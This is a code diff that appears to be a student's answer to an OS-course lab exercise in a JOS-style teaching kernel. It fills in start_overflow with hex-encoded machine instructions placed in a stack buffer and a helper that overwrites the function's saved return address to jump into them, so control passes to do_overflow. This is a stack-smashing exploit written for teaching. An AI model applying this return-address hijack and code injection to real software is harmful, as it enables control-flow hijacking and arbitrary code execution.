@@ -71,6 +71,14 @@ do_overflow(void)
     cprintf("Overflow success\n");
 }
 
+void getbuff(char* str){
+	int *pret;
+	int *p = (int*)str;
+	pret = (int*)read_pretaddr();
+	*p = *pret;//the normal return address of getbuff
+	*pret = (int)(p+1);//set the return  address to the address of attack code
+	return;
+}
 void
 start_overflow(void)
 {
@@ -83,15 +91,20 @@ start_overflow(void)
 
     // hint: You can use the read_pretaddr function to retrieve 
     //       the pointer to the function call return address;
-
+    
     char str[256] = {};
     int nstr = 0;
     char *pret_addr;
-
 	// Your code here.
+    char num;
+    int *ptr = (int*)str;
     
-
-
+    ptr[1] = 0xff24148b;
+    ptr[2] = 0x831a8b32;
+    ptr[3] = 0x555337c3;
+    ptr[4] = 0xc3c9e589;
+    getbuff(str);
+    cprintf("%s%n\n",str,&num);
 }
 
 void
